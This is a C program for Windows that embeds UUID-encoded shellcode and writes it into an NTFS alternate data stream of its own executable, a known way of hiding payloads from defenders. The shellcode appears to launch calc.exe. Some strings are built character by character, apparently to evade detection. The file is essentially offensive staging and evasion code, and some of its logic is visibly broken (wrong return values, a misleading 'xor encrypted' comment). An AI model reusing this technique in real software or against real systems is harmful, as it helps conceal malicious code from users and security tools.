#include <Windows.h>
#include <stdio.h>
#include <winternl.h>


unsigned char ntdll[] = { 'n','t','d','l','l',0 };

// x0r encrypt3d sh3llc0de


BYTE payload[] = "e48348fc-e8f0-00c0-0000-415141505251*d2314856-4865-528b-6048-8b5218488b52*728b4820-4850-b70f-4a4a-4d31c94831c0*7c613cac-2c02-4120-c1c9-0d4101c1e2ed*48514152-528b-8b20-423c-4801d08b8088*48000000-c085-6774-4801-d0508b481844*4920408b-d001-56e3-48ff-c9418b348848*314dd601-48c9-c031-ac41-c1c90d4101c1*f175e038-034c-244c-0845-39d175d85844*4924408b-d001-4166-8b0c-48448b401c49*8b41d001-8804-0148-d041-5841585e595a*59415841-5a41-8348-ec20-4152ffe05841*8b485a59-e912-ff57-ffff-5d48ba010000*00000000-4800-8d8d-0101-000041ba318b*d5ff876f-f0bb-a2b5-5641-baa695bd9dff*c48348d5-3c28-7c06-0a80-fbe07505bb47*6a6f7213-5900-8941-daff-d563616c632e*00657865-9090-9090-9090-909090909090";

BOOL ADSwrite(char* ADSpath) {
	char EnvSys[] = { 'S','y','s','t','e','m','D','r','i','v','e',0 };
	char sysDrive[MAX_PATH];
	if (!GetEnvironmentVariableA(EnvSys, sysDrive, MAX_PATH)) {
		printf("Failed in retrieving SystemDrive ENV variable (%u)\n", GetLastError());
		return -1;
	}
	lstrcatA(sysDrive, "\\\\");

	char FileSystemNameBuffer[1024];
	if (!GetVolumeInformationA(sysDrive, NULL, NULL, NULL, NULL, NULL, FileSystemNameBuffer, 1024 )) {
		printf("Failed in GetVolumeInformationA (%u)\n", GetLastError());
		return FALSE;
	}
	char ntfs[] = { 'N','T','F','S',0 };
	if (!strcmp(ntfs, FileSystemNameBuffer)) {
		HANDLE hFile = CreateFileA(ADSpath, GENERIC_READ | GENERIC_WRITE | FILE_WRITE_ATTRIBUTES, FILE_SHARE_READ, NULL, OPEN_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
		if (!hFile) {
			printf("Failed in CreateFileA (%u)\n", GetLastError());
			return FALSE;
		}

		DWORD bytesWritten;
		WriteFile(hFile, payload, sizeof(payload), &bytesWritten, NULL);

	
	}
}

int main(int agrc, char** argv) {
	printf("\n\n\n[+] Gets the Current Binary FullPathName\n");
	char ADSpath[MAX_PATH];
	if (!GetFullPathNameA(argv[0], MAX_PATH, ADSpath, NULL)) {
		printf("Failed in GetFullPathNameA (%u)\n", GetLastError());
		return -1;
	}
	lstrcatA(ADSpath, ":$DATA");
	printf("[+] Write the byte array UUID shellcode to the ADS of the Current Binary\n\n\n");
	if (!ADSwrite(ADSpath)) {
		printf("Failed in ADSwrite (%u)\n", GetLastError());
		return -1;
	}
	
	
}